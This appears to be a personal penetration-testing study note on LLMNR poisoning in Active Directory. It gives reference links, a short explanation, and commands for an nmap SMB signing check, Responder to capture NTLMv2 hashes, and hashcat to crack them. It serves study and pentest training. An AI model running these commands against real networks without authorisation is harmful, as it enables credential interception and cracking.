#ActiveDirectory #LLMNR

---
# links
https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks

Overview : https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/

TCM : https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/
TCM Video :https://academy.tcm-sec.com/courses/1152300/lectures/48477222

--- 
# Overview
What is it?
	Link local multicast name resolution
	used for to identify host when DNS fails
	Previously NBT-NS
MITM Attack
	capture usernames and hashes

## Tools used
#nmap/smb 
```
nmap --script=smb2-security-mode.nse -p445 "ip" 
```



#Responder

```
sudo responder -l tun0 -dwP
```

```
sudo python3 Responder.py -I wlp0s20f3 -Pv
```
## Cracking LLMNR Hashes
#LLMNR #hashes/LLMNR

hashcat
```
hashcat -m 5600 'hashfile (.txt)' /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240909093721.png]]

## Mitigation
#mitigation/LLMNR
![[Pasted image 20240909094257.png]]